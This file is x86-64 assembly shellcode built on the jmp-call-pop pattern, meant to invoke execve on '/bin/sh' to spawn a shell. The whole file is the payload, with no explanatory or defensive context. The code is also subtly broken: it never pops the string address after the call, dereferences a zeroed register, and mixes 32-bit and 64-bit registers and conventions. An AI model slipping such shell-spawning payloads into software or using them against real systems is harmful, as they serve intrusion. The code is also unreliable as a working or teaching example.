section .text
global _start

_start:
    ; Jump to the shellcode
    jmp short GotoCall

shellcode:
    ; Set up the null-terminated "/bin/sh" string in memory
    xor esi, esi               ; zero out esi
    mov eax, esi               ; zero out eax
    mov byte [esi + 7], al     ; null terminate /bin/sh

    ; Set up the argv array
    lea ebx, [esi]             ; ebx = &/bin/sh
    mov qword [esi + 8], rbx   ; argv[0] = &/bin/sh
    mov qword [esi + 16], rax  ; argv[1] = NULL

    ; Prepare syscall arguments
    mov al, 0x3b               ; execve syscall number
    mov rdi, rbx               ; rdi = &/bin/sh
    lea rsi, [esi + 8]         ; rsi = &argv[0]
    lea rdx, [esi + 16]        ; rdx = &argv[1]

    ; Make the syscall
    syscall

GotoCall:
    ; Call the shellcode
    call shellcode

    ; String "/bin/shJAAAAKKKK"
    db '/bin/shJAAAAKKKK'

